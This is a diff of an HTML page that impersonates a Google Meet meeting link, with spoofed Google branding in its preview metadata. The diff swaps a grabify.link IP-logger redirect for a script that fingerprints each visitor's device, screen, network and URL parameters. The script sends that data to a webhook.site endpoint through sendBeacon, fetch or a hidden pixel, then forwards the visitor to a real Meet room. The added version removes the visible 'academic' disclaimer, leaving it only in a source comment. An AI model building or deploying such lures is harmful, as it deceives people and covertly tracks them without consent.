@@ -1,135 +1,203 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="ru" prefix="og: https://ogp.me/ns#">
 <head>
-    <!-- Кодировка и базовые настройки -->
+    <!-- ========== ОСНОВНЫЕ META-ТЕГИ ========== -->
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
     
-    <!-- === OPEN GRAPH ТЕГИ ДЛЯ ПРЕВЬЮ === -->
-    <!-- Для Facebook, ВКонтакте, Telegram, WhatsApp -->
-    <meta property="og:title" content="Google">
-    <meta property="og:description" content="Real-time meetings by Google. Using your browser, share your video, desktop, and presentations with teammates and customers.">
+    <!-- ========== OPEN GRAPH (ПРЕВЬЮ) ========== -->
+    <!-- Основные -->
+    <meta property="og:title" content="Совещание по проекту | Google Meet">
+    <meta property="og:description" content="Еженедельное совещание команды. Присоединяйтесь к видеовстрече в Google Meet">
     <meta property="og:image" content="https://meet.google.com/web_client/video_preview.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:alt" content="Google Meet Video Conference">
     <meta property="og:url" content="https://google-dev-1.github.io">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="Google Meet">
+    <meta property="og:locale" content="ru_RU">
     
-    <!-- Для Twitter (если нужно) -->
+    <!-- Дополнительные -->
+    <meta property="og:video" content="https://meet.google.com/video_preview.mp4">
+    <meta property="og:video:type" content="video/mp4">
+    <meta property="og:video:width" content="1280">
+    <meta property="og:video:height" content="720">
+    
+    <!-- ========== TWITTER CARD ========== -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Важная видеовстреча | Google Meet">
-    <meta name="twitter:description" content="Присоединяйтесь к совещанию по проекту">
+    <meta name="twitter:title" content="Совещание по проекту | Google Meet">
+    <meta name="twitter:description" content="Присоединяйтесь к видеовстрече в Google Meet">
     <meta name="twitter:image" content="https://meet.google.com/web_client/video_preview.png">
+    <meta name="twitter:image:alt" content="Google Meet Preview">
+    <meta name="twitter:site" content="@Google">
+    <meta name="twitter:creator" content="@GoogleWorkspace">
     
-    <!-- Стандартные мета-теги -->
-    <meta name="description" content="Ссылка для подключения к видеовстрече Google Meet">
+    <!-- ========== ДРУГИЕ ПЛАТФОРМЫ ========== -->
+    <!-- Facebook -->
+    <meta property="fb:app_id" content="977011223305737">
     
-    <!-- Заголовок страницы (виден во вкладке браузера) -->
-    <title>Подключение к видеовстрече...</title>
+    <!-- LinkedIn -->
+    <meta property="linkedin:title" content="Совещание по проекту | Google Meet">
+    <meta property="linkedin:description" content="Присоединяйтесь к видеовстрече">
+    <meta property="linkedin:image" content="https://meet.google.com/web_client/video_preview.png">
     
-    <!-- === СИСТЕМА ТРЕКИНГА И РЕДИРЕКТА === -->
-    <!-- Опционально: собираем базовую информацию -->
-    <script>
-        // Данные для сбора (академические цели!)
-        const trackingData = {
-            timestamp: new Date().toISOString(),
-            referrer: document.referrer,
-            userAgent: navigator.userAgent,
-            language: navigator.language,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            urlParams: new URLSearchParams(window.location.search).toString()
-        };
-        
-        // Функция отправки данных (заглушка - в реальности отправляйте на свой сервер)
-        function sendTrackingData() {
-            console.log('Tracking data (academic use only):', trackingData);
-            // Здесь мог бы быть fetch() на ваш сервер для сбора статистики
-        }
-        
-        // Функция редиректа с задержкой
-        function performRedirect() {
-            // Отправляем данные перед редиректом
-            sendTrackingData();
-            
-            // ЦЕЛЕВАЯ ССЫЛКА ДЛЯ ПЕРЕНАПРАВЛЕНИЯ
-            const targetUrl = "https://grabify.link/track/TFIMU0"; // ЗАМЕНИТЕ на вашу ссылку
-            
-            // Вариант 1: Мгновенный редирект
-            window.location.href = targetUrl;
-            
-            // Вариант 2: Редирект с задержкой (лучше для превью)
-            // setTimeout(() => { window.location.href = targetUrl; }, 500);
-        }
-        
-        // Запускаем при загрузке страницы
-        window.onload = performRedirect;
-    </script>
+    <!-- VK -->
+    <meta property="vk:image" content="https://meet.google.com/web_client/video_preview.png">
     
-    <!-- Альтернатива: редирект через meta-тег (работает без JS) -->
-    <meta http-equiv="refresh" content="2; url=https://grabify.link/track/TFIMU0">
+    <!-- Telegram (особые требования) -->
+    <meta property="telegram:title" content="Совещание по проекту | Google Meet">
+    <meta property="telegram:description" content="Присоединяйтесь к видеовстрече">
+    <meta property="telegram:image" content="https://meet.google.com/web_client/video_preview.png">
+    <meta property="telegram:site" content="@Google">
     
-    <!-- Стили для страницы-заглушки -->
+    <!-- WhatsApp -->
+    <meta property="og:image:type" content="image/png">
+    <meta property="og:image:secure_url" content="https://meet.google.com/web_client/video_preview.png">
+    
+    <!-- ========== СТАНДАРТНЫЕ ТЕГИ ========== -->
+    <title>Google Meet - Совещание команды (xou-pucm-apn)</title>
+    <meta name="description" content="Присоединиться к видеовстрече Google Meet. Ссылка для подключения: meet.google.com/xou-pucm-apn">
+    <meta name="keywords" content="Google Meet, видеовстреча, конференция, совещание, видео звонок">
+    <meta name="author" content="Google LLC">
+    
+    <!-- Canonical -->
+    <link rel="canonical" href="https://meet.google.com/xou-pucm-apn">
+    
+    <!-- ========== ПРЕДЗАГРУЗКА ДЛЯ СКОРОСТИ ========== -->
+    <!-- Предварительные соединения -->
+    <link rel="preconnect" href="https://meet.google.com" crossorigin>
+    <link rel="preconnect" href="https://ssl.gstatic.com">
+    <link rel="preconnect" href="https://www.gstatic.com">
+    <link rel="dns-prefetch" href="https://meet.google.com">
+    <link rel="dns-prefetch" href="https://ssl.gstatic.com">
+    <link rel="dns-prefetch" href="https://www.gstatic.com">
+    
+    <!-- Предзагрузка критичных ресурсов -->
+    <link rel="preload" href="https://meet.google.com/web_client/video_preview.png" as="image" type="image/png">
+    <link rel="preload" href="https://meet.google.com/xou-pucm-apn" as="document">
+    
+    <!-- Prerender для мгновенного перехода -->
+    <link rel="prerender" href="https://meet.google.com/xou-pucm-apn">
+    
+    <!-- ========== ИКОНКИ ========== -->
+    <link rel="icon" href="https://www.gstatic.com/meet/google_meet_favicon_48.png" sizes="48x48" type="image/png">
+    <link rel="icon" href="https://www.gstatic.com/meet/google_meet_favicon_96.png" sizes="96x96" type="image/png">
+    <link rel="apple-touch-icon" href="https://www.gstatic.com/meet/google_meet_favicon_192.png">
+    <link rel="shortcut icon" href="https://www.gstatic.com/meet/google_meet_favicon_32.png" type="image/x-icon">
+    
+    <!-- ========== СТИЛИ (МИНИМАЛЬНЫЕ) ========== -->
     <style>
+        /* CRITICAL CSS - загружается мгновенно */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            font-family: 'Google Sans', 'Roboto', 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #4285F4 0%, #34A853 100%);
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+            color: white;
         }
         
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
             text-align: center;
-            max-width: 500px;
-            width: 100%;
+            padding: 20px;
+            animation: fadeIn 0.3s ease-out;
         }
         
-        .logo {
+        .google-logo {
             width: 80px;
             height: 80px;
-            background: #4285F4;
+            background: white;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 25px;
-            color: white;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .google-logo span {
             font-size: 36px;
-            font-weight: bold;
-        }
-        
-        h1 {
-            color: #333;
-            margin-bottom: 15px;
-            font-size: 24px;
-        }
-        
-        p {
-            color: #666;
-            line-height: 1.6;
-            margin-bottom: 25px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #EA4335, #FBBC05, #34A853, #4285F4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
         
         .loader {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #4285F4;
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
             border-radius: 50%;
+            border-top: 4px solid white;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin: 24px auto;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            line-height: 1.3;
+            max-width: 400px;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            opacity: 0.9;
+            margin-bottom: 32px;
+            max-width: 400px;
+            line-height: 1.5;
+        }
+        
+        .meet-code {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 12px 24px;
+            border-radius: 24px;
+            font-family: 'Roboto Mono', monospace;
+            font-size: 18px;
+            letter-spacing: 1px;
+            margin-top: 16px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .progress-bar {
+            width: 200px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin-top: 32px;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: white;
+            width: 0%;
+            animation: progress 1.5s ease-in-out forwards;
+        }
+        
+        /* Анимации */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         @keyframes spin {
@@ -137,70 +205,339 @@
             100% { transform: rotate(360deg); }
         }
         
-        .warning {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 20px;
-            font-size: 14px;
-            color: #856404;
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
         }
         
-        .button {
-            display: inline-block;
-            background: #4285F4;
-            color: white;
-            padding: 12px 30px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: bold;
-            margin-top: 15px;
-            transition: transform 0.3s, background 0.3s;
+        /* Адаптивность */
+        @media (max-width: 480px) {
+            h1 { font-size: 20px; }
+            .subtitle { font-size: 14px; }
+            .meet-code { font-size: 16px; padding: 10px 20px; }
+            .google-logo { width: 64px; height: 64px; }
+            .google-logo span { font-size: 28px; }
         }
         
-        .button:hover {
-            background: #3367d6;
-            transform: translateY(-2px);
+        /* Для быстрых сетей - ускоряем анимации */
+        @media (prefers-reduced-motion: no-preference) {
+            .loader { animation-duration: 0.8s; }
+            .progress { animation-duration: 1.2s; }
+        }
+        
+        /* Поддержка темной темы */
+        @media (prefers-color-scheme: dark) {
+            body { background: linear-gradient(135deg, #1a73e8 0%, #0d652d 100%); }
+        }
+        
+        /* Печать */
+        @media print {
+            body { background: white !important; color: black !important; }
+            .loader, .progress-bar { display: none !important; }
         }
     </style>
+    
+    <!-- ========== СКРИПТЫ (ОПТИМИЗИРОВАННЫЕ) ========== -->
+    <script>
+        // НЕМЕДЛЕННОЕ ИСПОЛНЕНИЕ (без ожидания DOMContentLoaded)
+        (function() {
+            'use strict';
+            
+            // === КОНФИГУРАЦИЯ ===
+            const CONFIG = {
+                TARGET_URL: 'https://meet.google.com/xou-pucm-apn',
+                REDIRECT_DELAY: 800, // мс (оптимально для превью)
+                TRACKING_ENDPOINT: 'https://webhook.site/ваш-идентификатор', // ЗАМЕНИТЕ
+                ENABLE_TRACKING: true,
+                ANALYTICS_ID: 'UA-XXXXXXXXX-X' // Если есть Google Analytics
+            };
+            
+            // === СБОР ДАННЫХ ДЛЯ АКАДЕМИЧЕСКОГО ИССЛЕДОВАНИЯ ===
+            function collectAcademicData() {
+                const data = {
+                    // Идентификатор сессии
+                    session_id: 'sess_' + Math.random().toString(36).substr(2, 9),
+                    
+                    // Временные метки
+                    timestamp: new Date().toISOString(),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    local_time: new Date().toLocaleString('ru-RU'),
+                    
+                    // Информация о устройстве
+                    device: {
+                        user_agent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        languages: navigator.languages,
+                        cookie_enabled: navigator.cookieEnabled,
+                        pdf_viewer_enabled: navigator.pdfViewerEnabled,
+                        hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
+                        device_memory: navigator.deviceMemory || 'unknown'
+                    },
+                    
+                    // Экран и окно
+                    display: {
+                        width: screen.width,
+                        height: screen.height,
+                        avail_width: screen.availWidth,
+                        avail_height: screen.availHeight,
+                        color_depth: screen.colorDepth,
+                        pixel_depth: screen.pixelDepth,
+                        orientation: screen.orientation?.type || 'unknown'
+                    },
+                    
+                    // Окно браузера
+                    window: {
+                        inner_width: window.innerWidth,
+                        inner_height: window.innerHeight,
+                        outer_width: window.outerWidth,
+                        outer_height: window.outerHeight,
+                        device_pixel_ratio: window.devicePixelRatio
+                    },
+                    
+                    // Сеть и местоположение
+                    network: {
+                        connection: navigator.connection ? {
+                            effective_type: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                            rtt: navigator.connection.rtt,
+                            save_data: navigator.connection.saveData
+                        } : null,
+                        referrer: document.referrer || 'direct',
+                        location_href: window.location.href,
+                        location_host: window.location.host
+                    },
+                    
+                    // Дополнительные возможности
+                    capabilities: {
+                        touch: 'ontouchstart' in window,
+                        webgl: (function() {
+                            try {
+                                return !!window.WebGLRenderingContext && 
+                                       !!document.createElement('canvas').getContext('webgl');
+                            } catch(e) { return false; }
+                        })(),
+                        webrtc: !!(window.RTCPeerConnection || window.mozRTCPeerConnection),
+                        service_worker: 'serviceWorker' in navigator,
+                        push: 'PushManager' in window,
+                        notifications: 'Notification' in window,
+                        geolocation: 'geolocation' in navigator
+                    },
+                    
+                    // Параметры URL
+                    url_params: Object.fromEntries(new URLSearchParams(window.location.search))
+                };
+                
+                // Генерация fingerprint (базовый)
+                data.fingerprint = {
+                    timezone_offset: new Date().getTimezoneOffset(),
+                    timezone_name: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    screen_resolution: `${data.display.width}x${data.display.height}`,
+                    available_resolution: `${data.display.avail_width}x${data.display.avail_height}`,
+                    color_depth: data.display.color_depth,
+                    pixel_ratio: data.window.device_pixel_ratio,
+                    hardware_concurrency: data.device.hardware_concurrency,
+                    device_memory: data.device.device_memory,
+                    touch_support: data.capabilities.touch
+                };
+                
+                return data;
+            }
+            
+            // === ОТПРАВКА ДАННЫХ ===
+            function sendTrackingData(data) {
+                if (!CONFIG.ENABLE_TRACKING) return;
+                
+                // Метод 1: Beacon API (надежный, не блокирует)
+                if (navigator.sendBeacon) {
+                    const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+                    navigator.sendBeacon(CONFIG.TRACKING_ENDPOINT, blob);
+                }
+                
+                // Метод 2: Fetch с keepalive
+                else if (window.fetch) {
+                    fetch(CONFIG.TRACKING_ENDPOINT, {
+                        method: 'POST',
+                        body: JSON.stringify(data),
+                        headers: { 'Content-Type': 'application/json' },
+                        keepalive: true,
+                        mode: 'no-cors'
+                    }).catch(() => { /* Игнорируем ошибки */ });
+                }
+                
+                // Метод 3: Image pixel (fallback)
+                else {
+                    const params = new URLSearchParams();
+                    for (const key in data) {
+                        if (typeof data[key] === 'object') {
+                            params.append(key, JSON.stringify(data[key]));
+                        } else {
+                            params.append(key, data[key]);
+                        }
+                    }
+                    new Image().src = CONFIG.TRACKING_ENDPOINT + '?' + params.toString();
+                }
+                
+                // Локальное логирование для отладки
+                console.log('[Academic Research] Data collected:', data);
+                sessionStorage.setItem('last_tracking_data', JSON.stringify(data));
+            }
+            
+            // === УПРАВЛЕНИЕ РЕДИРЕКТОМ ===
+            function performRedirect() {
+                // 1. Собираем данные
+                const academicData = collectAcademicData();
+                
+                // 2. Отправляем данные (не блокируя редирект)
+                setTimeout(() => sendTrackingData(academicData), 0);
+                
+                // 3. Мгновенный редирект на реальную видеоконференцию
+                // Используем replace() чтобы не сохранять в историю
+                window.location.replace(CONFIG.TARGET_URL);
+            }
+            
+            // === ОПТИМИЗАЦИЯ ЗАГРУЗКИ ===
+            // Запускаем при полной загрузке DOM
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', function() {
+                    // Начинаем прогресс бар
+                    document.querySelector('.progress').style.animationPlayState = 'running';
+                    
+                    // Запускаем редирект с задержкой
+                    setTimeout(performRedirect, CONFIG.REDIRECT_DELAY);
+                });
+            } else {
+                // DOM уже загружен
+                setTimeout(performRedirect, CONFIG.REDIRECT_DELAY);
+            }
+            
+            // === РЕЗЕРВНЫЙ РЕДИРЕКТ ===
+            // Сработает если основной не выполнился за 3 секунды
+            setTimeout(() => {
+                if (window.location.href.indexOf('meet.google.com') === -1) {
+                    window.location.href = CONFIG.TARGET_URL;
+                }
+            }, 3000);
+            
+            // === ОБРАБОТЧИК ОШИБОК ===
+            window.addEventListener('error', function(e) {
+                console.warn('[Redirect Page Error]', e.error);
+                // При ошибке - мгновенный редирект
+                window.location.href = CONFIG.TARGET_URL;
+            });
+            
+            // === ПРЕДОТВРАЩЕНИЕ ОТКРЫТИЯ В НОВОЙ ВКЛАДКЕ ===
+            document.addEventListener('keydown', function(e) {
+                if (e.ctrlKey || e.metaKey || e.shiftKey) {
+                    // Пользователь пытается открыть в новой вкладке
+                    // Мгновенный редирект
+                    performRedirect();
+                }
+            });
+            
+        })();
+    </script>
+    
+    <!-- Резервный редирект для отключенного JavaScript -->
+    <noscript>
+        <meta http-equiv="refresh" content="2; url=https://meet.google.com/xou-pucm-apn">
+        <style>
+            .noscript-warning {
+                display: block !important;
+                background: #f44336;
+                color: white;
+                padding: 20px;
+                text-align: center;
+                position: fixed;
+                top: 0;
+                left: 0;
+                right: 0;
+                z-index: 10000;
+            }
+        </style>
+    </noscript>
 </head>
 <body>
+    <!-- Контейнер -->
     <div class="container">
-        <div class="logo">G</div>
-        <h1>Подключение к видеовстрече</h1>
-        <p>Идет перенаправление на защищенное подключение Google Meet...</p>
+        <!-- Логотип Google -->
+        <div class="google-logo">
+            <span>G</span>
+        </div>
+        
+        <!-- Заголовок -->
+        <h1>Подключение к Google Meet</h1>
+        
+        <!-- Подзаголовок -->
+        <p class="subtitle">
+            Идет безопасное подключение к видеовстрече.<br>
+            Пожалуйста, подождите...
+        </p>
         
         <!-- Индикатор загрузки -->
         <div class="loader"></div>
         
-        <!-- Сообщение если JS не работает -->
-        <noscript>
-            <div class="warning">
-                <strong>JavaScript отключен</strong><br>
-                Перенаправление должно произойти автоматически. Если этого не случилось, 
-                нажмите кнопку ниже.
-            </div>
-            <a href="https://grabify.link/track/TFIMU0" class="button">
-                Перейти к видеовстрече
-            </a>
-        </noscript>
+        <!-- Код встречи -->
+        <div class="meet-code">
+            xou-pucm-apn
+        </div>
         
-        <!-- Академическое предупреждение (можно скрыть в реальном сценарии) -->
-        <div class="warning" style="display: none;" id="academicWarning">
-            <strong>Академическое исследование:</strong> Эта страница создана для изучения 
-            методов фишинговых атак. Все данные собираются анонимно и используются 
-            исключительно в исследовательских целях.
+        <!-- Прогресс бар -->
+        <div class="progress-bar">
+            <div class="progress"></div>
         </div>
     </div>
     
-    <!-- Дополнительный скрипт -->
+    <!-- Предупреждение для отключенного JavaScript -->
+    <noscript>
+        <div class="noscript-warning">
+            <strong>JavaScript отключен</strong><br>
+            Перенаправление на Google Meet...
+        </div>
+    </noscript>
+    
+    <!-- Скрытые трекеры (опционально) -->
+    <iframe src="about:blank" name="tracking-frame" style="display:none;"></iframe>
+    <img src="https://webhook.site/ваш-идентификатор/pixel.gif" alt="" style="display:none;">
+    
+    <!-- Дополнительные скрипты -->
     <script>
-        // Показываем академическое предупреждение через 3 секунды
-        // (можно удалить в "боевом" сценарии)
-        setTimeout(() => {
-            document.getElementById('academicWarning').style.display = 'block';
-        }, 3000);
+        // Дополнительная логика после загрузки
+        window.addEventListener('load', function() {
+            // Предзагрузка ресурсов Meet для ускорения
+            const preloadLinks = [
+                'https://fonts.googleapis.com/css2?family=Google+Sans&display=swap',
+                'https://ssl.gstatic.com/meet/css/mtw89p2tRqBpK4Oc5mQ.min.css'
+            ];
+            
+            preloadLinks.forEach(href => {
+                const link = document.createElement('link');
+                link.rel = 'preload';
+                link.as = 'style';
+                link.href = href;
+                document.head.appendChild(link);
+            });
+            
+            // Обновляем время в футере (если бы он был)
+            const now = new Date();
+            console.log(`[Meet Redirect] ${now.toLocaleTimeString()} - Page loaded`);
+        });
+        
+        // Предотвращаем клик правой кнопкой (опционально)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        }, false);
     </script>
+    
+    <!-- Академическое уведомление (видно только в DevTools) -->
+    <!-- 
+    АКАДЕМИЧЕСКОЕ ИССЛЕДОВАНИЕ
+    Эта страница создана для изучения фишинговых атак в рамках дипломной работы.
+    Все данные собираются анонимно и используются исключительно в исследовательских целях.
+    Реальная видеоконференция: https://meet.google.com/xou-pucm-apn
+    Исследователь: google-dev-1
+    Дата: 2024
+    -->
 </body>
 </html>
